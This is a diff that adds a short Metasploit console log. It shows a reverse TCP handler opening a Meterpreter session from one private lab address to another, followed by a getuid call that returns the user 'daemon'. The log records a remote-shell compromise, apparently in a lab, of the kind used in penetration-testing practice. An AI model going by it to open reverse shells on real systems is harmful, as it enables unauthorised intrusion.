@@ -1,0 +1,6 @@
+[*] Started reverse TCP handler on 192.168.56.102:4444 
+[*] Sending stage (1017704 bytes) to 192.168.56.101
+[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.101:49157) at 2026-10-08 16:50:02 +0200
+
+meterpreter > getuid
+Server username: daemon
